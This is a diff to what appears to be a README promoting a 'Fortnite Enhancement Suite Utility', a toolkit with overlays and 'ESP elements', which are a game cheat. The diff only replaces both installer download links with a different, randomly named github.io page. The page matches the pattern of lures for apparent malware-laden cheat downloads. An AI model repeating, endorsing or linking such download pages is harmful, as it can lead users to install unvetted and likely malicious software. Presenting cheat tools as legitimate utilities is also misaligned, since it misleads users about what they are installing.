@@ -2,7 +2,7 @@
 
 Fortnite Enhancement Suite Utility is a comprehensive performance enhancement and utility toolkit designed for players seeking an optimized and customizable gameplay experience. This suite integrates features for real-time game data overlay and fine-tuned system adjustments, focusing on stability and user-configurable settings for Fortnite.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -40,4 +40,4 @@ A: Absolutely. All features, including the ESP elements and overlay metrics, are
 
 You can obtain the latest version of the Fortnite Enhancement Suite Utility from our official distribution point. Always download from trusted sources.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
